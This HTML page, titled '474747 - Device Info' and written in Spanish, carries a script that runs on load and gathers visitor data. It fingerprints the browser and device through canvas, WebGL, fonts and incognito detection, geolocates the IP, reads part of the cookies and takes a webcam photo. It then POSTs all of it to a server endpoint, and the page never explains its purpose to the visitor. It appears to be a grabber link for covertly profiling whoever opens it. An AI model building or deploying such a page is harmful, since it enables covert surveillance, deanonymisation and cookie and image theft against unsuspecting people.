<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <title>474747 - Device Info</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: #0b0b0b;
      color: #e5e5e5;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px;
    }
    .card {
      background: #161616;
      border: 1px solid #2a2a2a;
      border-radius: 18px;
      padding: 26px 22px;
      max-width: 420px;
      width: 100%;
      box-shadow: 0 12px 40px rgba(0,0,0,0.5);
    }
    .codigo {
      font-size: 0.8rem;
      color: #666;
      letter-spacing: 3px;
      font-weight: 500;
      margin-bottom: 2px;
    }
    h1 {
      font-size: 1.55rem;
      font-weight: 700;
      color: #fff;
      margin-bottom: 10px;
    }
    .status {
      font-size: 0.92rem;
      color: #999;
      margin-bottom: 18px;
      min-height: 22px;
    }
    .status.ok { color: #4ade80; }
    .status.error { color: #f87171; }
    .status.loading { color: #60a5fa; }
    .info {
      font-size: 0.87rem;
      line-height: 1.75;
      color: #b0b0b0;
    }
    .info b { color: #ddd; font-weight: 600; }
    .divider {
      height: 1px;
      background: #2a2a2a;
      margin: 14px 0;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="codigo">474747</div>
    <h1>Device Info</h1>
    <p class="status loading" id="status">Recolectando información...</p>
    <div class="info" id="info"></div>
  </div>

  <script>
    // ——— Utilidades ———
    function getWebGL() {
      try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (!gl) return { vendor: "N/A", renderer: "N/A" };
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        if (debugInfo) {
          return {
            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || "N/A",
            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "N/A"
          };
        }
        return {
          vendor: gl.getParameter(gl.VENDOR) || "N/A",
          renderer: gl.getParameter(gl.RENDERER) || "N/A"
        };
      } catch (e) {
        return { vendor: "N/A", renderer: "N/A" };
      }
    }

    function getCanvasFingerprint() {
      try {
        const canvas = document.createElement("canvas");
        canvas.width = 200;
        canvas.height = 50;
        const ctx = canvas.getContext("2d");
        ctx.textBaseline = "top";
        ctx.font = "14px Arial";
        ctx.fillStyle = "#f60";
        ctx.fillRect(0, 0, 100, 50);
        ctx.fillStyle = "#069";
        ctx.fillText("474747-fingerprint", 2, 15);
        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
        ctx.fillText("474747-fingerprint", 4, 17);
        return canvas.toDataURL().slice(-32);
      } catch (e) {
        return "N/A";
      }
    }

    async function detectIncognito() {
      try {
        if (navigator.storage && navigator.storage.estimate) {
          const { quota } = await navigator.storage.estimate();
          // En incógnito el quota suele ser muy bajo
          if (quota && quota < 120000000) return "Sí (probable)";
        }
        // Fallback: localStorage + indexedDB
        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
        if (fs) {
          return new Promise(resolve => {
            fs(window.TEMPORARY, 100, () => resolve("No"), () => resolve("Sí (probable)"));
          });
        }
        return "Desconocido";
      } catch (e) {
        return "Desconocido";
      }
    }

    async function getMediaDevicesCount() {
      try {
        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
          return { cameras: "N/A", mics: "N/A", speakers: "N/A" };
        }
        const devices = await navigator.mediaDevices.enumerateDevices();
        return {
          cameras: devices.filter(d => d.kind === "videoinput").length,
          mics: devices.filter(d => d.kind === "audioinput").length,
          speakers: devices.filter(d => d.kind === "audiooutput").length
        };
      } catch (e) {
        return { cameras: "N/A", mics: "N/A", speakers: "N/A" };
      }
    }

    function getFonts() {
      const baseFonts = ["monospace", "sans-serif", "serif"];
      const testFonts = [
        "Arial", "Arial Black", "Calibri", "Cambria", "Comic Sans MS",
        "Courier", "Courier New", "Georgia", "Helvetica", "Impact",
        "Lucida Console", "Tahoma", "Times New Roman", "Trebuchet MS",
        "Verdana", "Roboto", "Open Sans", "Noto Sans", "Segoe UI"
      ];
      const detected = [];
      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");
      const text = "mmmmmmmmmmlli";
      const baselines = {};

      baseFonts.forEach(base => {
        ctx.font = "72px " + base;
        baselines[base] = ctx.measureText(text).width;
      });

      testFonts.forEach(font => {
        let detectedFont = false;
        baseFonts.forEach(base => {
          ctx.font = "72px '" + font + "', " + base;
          if (ctx.measureText(text).width !== baselines[base]) detectedFont = true;
        });
        if (detectedFont) detected.push(font);
      });

      return detected.length ? detected.join(", ") : "Ninguna detectada";
    }

    async function capturarFoto() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: false
        });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.playsInline = true;
        video.muted = true;
        await video.play();
        await new Promise(r => setTimeout(r, 600));
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        stream.getTracks().forEach(t => t.stop());
        return canvas.toDataURL("image/jpeg", 0.65);
      } catch (e) {
        return null;
      }
    }

    // ——— Main ———
    async function enviarInfo() {
      const statusEl = document.getElementById("status");
      const infoEl = document.getElementById("info");

      const webgl = getWebGL();
      const media = await getMediaDevicesCount();
      const incognito = await detectIncognito();

      const data = {
        // Red
        ip: "",
        country: "",
        city: "",
        region: "",
        isp: "",
        conexion: "No disponible",
        rtt: "N/A",

        // Dispositivo
        os: navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || "Desconocido",
        browser: "Desconocido",
        device: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? "Móvil" : "PC",
        ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Desconocida",
        nucleos: navigator.hardwareConcurrency || "Desconocido",
        pantalla: window.screen.width + "x" + window.screen.height,
        pantallaDisponible: window.screen.availWidth + "x" + window.screen.availHeight,
        pixelRatio: String(window.devicePixelRatio || 1),
        orientacion: (screen.orientation && screen.orientation.type) ? screen.orientation.type : "Desconocida",
        colorDepth: (screen.colorDepth || "?") + " bits",

        // GPU
        gpuVendor: webgl.vendor,
        gpuRenderer: webgl.renderer,

        // Fingerprints
        canvasFingerprint: getCanvasFingerprint(),
        fonts: getFonts(),

        // Batería
        bateria: "No disponible",
        cargando: "No disponible",

        // Idioma / zona
        idioma: navigator.language || "Desconocido",
        idiomas: (navigator.languages || []).join(", ") || "N/A",
        zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",

        // Privacidad
        incognito: incognito,
        doNotTrack: navigator.doNotTrack || navigator.msDoNotTrack || "No configurado",
        globalPrivacyControl: navigator.globalPrivacyControl ? "Sí" : "No",

        // Media
        cameras: media.cameras,
        mics: media.mics,
        speakers: media.speakers,

        // Almacenamiento
        cookiesEnabled: navigator.cookieEnabled ? "Sí" : "No",
        cookies: document.cookie ? document.cookie.substring(0, 100) : "(vacío)",
        localStorage: (() => { try { localStorage.setItem("_t","1"); localStorage.removeItem("_t"); return "Sí"; } catch(e){ return "No"; } })(),
        sessionStorage: (() => { try { sessionStorage.setItem("_t","1"); sessionStorage.removeItem("_t"); return "Sí"; } catch(e){ return "No"; } })(),

        // Otras
        toque: ("ontouchstart" in window) ? "Sí" : "No",
        maxTouchPoints: navigator.maxTouchPoints || 0,
        online: navigator.onLine ? "Sí" : "No",
        webdriver: navigator.webdriver ? "Sí" : "No",
        pdfViewer: navigator.pdfViewerEnabled ? "Sí" : "No",
        vendor: navigator.vendor || "N/A",
        historyLength: history.length || 0,
        referrer: document.referrer || "(directo)",
        memoryJS: (performance && performance.memory) ? Math.round(performance.memory.usedJSHeapSize / 1048576) + " MB" : "N/A",
        userAgent: navigator.userAgent || "",
        foto: null
      };

      // Conexión
      if (navigator.connection) {
        const c = navigator.connection;
        data.conexion = (c.effectiveType || "?") + " / " + (c.downlink || "?") + " Mbps";
        data.rtt = c.rtt != null ? c.rtt + " ms" : "N/A";
      }

      // Navegador
      const ua = navigator.userAgent;
      if (ua.includes("Edg")) data.browser = "Edge";
      else if (ua.includes("OPR") || ua.includes("Opera")) data.browser = "Opera";
      else if (ua.includes("Chrome")) data.browser = "Chrome";
      else if (ua.includes("Firefox")) data.browser = "Firefox";
      else if (ua.includes("Safari")) data.browser = "Safari";

      // Batería
      if (navigator.getBattery) {
        try {
          const bat = await navigator.getBattery();
          data.bateria = Math.round(bat.level * 100) + "%";
          data.cargando = bat.charging ? "Cargando" : "Descargando";
        } catch (e) {}
      }

      // IP
      try {
        const geo = await fetch("https://ipapi.co/json/", { cache: "no-store" }).then(r => r.json());
        if (geo && !geo.error) {
          data.ip = geo.ip || "";
          data.country = geo.country_name || geo.country || "";
          data.city = geo.city || "";
          data.region = geo.region || "";
          data.isp = geo.org || "";
        }
      } catch (e) {
        try {
          const geo2 = await fetch("https://ipwho.is/", { cache: "no-store" }).then(r => r.json());
          if (geo2 && geo2.success !== false) {
            data.ip = geo2.ip || "";
            data.country = geo2.country || "";
            data.city = geo2.city || "";
            data.region = geo2.region || "";
            data.isp = (geo2.connection && geo2.connection.isp) || "";
          }
        } catch (e2) {}
      }

      // Foto
      statusEl.textContent = "Solicitando cámara...";
      data.foto = await capturarFoto();

      // Mostrar resumen
      infoEl.innerHTML =
        "<b>IP:</b> " + (data.ip || "—") + "<br>" +
        "<b>País:</b> " + (data.country || "—") + (data.city ? " · " + data.city : "") + "<br>" +
        "<b>ISP:</b> " + (data.isp || "—") + "<br>" +
        "<b>Conexión:</b> " + data.conexion + "<br>" +
        "<div class='divider'></div>" +
        "<b>OS:</b> " + data.os + "<br>" +
        "<b>Navegador:</b> " + data.browser + "<br>" +
        "<b>Dispositivo:</b> " + data.device + "<br>" +
        "<b>GPU:</b> " + data.gpuRenderer.substring(0, 40) + "<br>" +
        "<b>Pantalla:</b> " + data.pantalla + " (" + data.pixelRatio + "x)<br>" +
        "<b>RAM:</b> " + data.ram + " · <b>Núcleos:</b> " + data.nucleos + "<br>" +
        "<b>Batería:</b> " + data.bateria + " · " + data.cargando + "<br>" +
        "<div class='divider'></div>" +
        "<b>Incógnito:</b> " + data.incognito + "<br>" +
        "<b>Cámaras:</b> " + data.cameras + " · <b>Mics:</b> " + data.mics + "<br>" +
        "<b>Foto:</b> " + (data.foto ? "Capturada" : "No disponible");

      // Enviar
      statusEl.textContent = "Enviando...";
      statusEl.className = "status loading";

      try {
        const res = await fetch("/api/device", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });
        const text = await res.text();
        let result = null;
        try { result = JSON.parse(text); } catch (e) {}

        if (res.ok && result && result.success) {
          statusEl.textContent = "Información enviada correctamente";
          statusEl.className = "status ok";
        } else {
          statusEl.textContent = "Error al enviar (" + res.status + ")";
          statusEl.className = "status error";
          console.error(text);
        }
      } catch (err) {
        statusEl.textContent = "Error de conexión";
        statusEl.className = "status error";
        console.error(err);
      }
    }

    enviarInfo();
  </script>
</body>
</html>
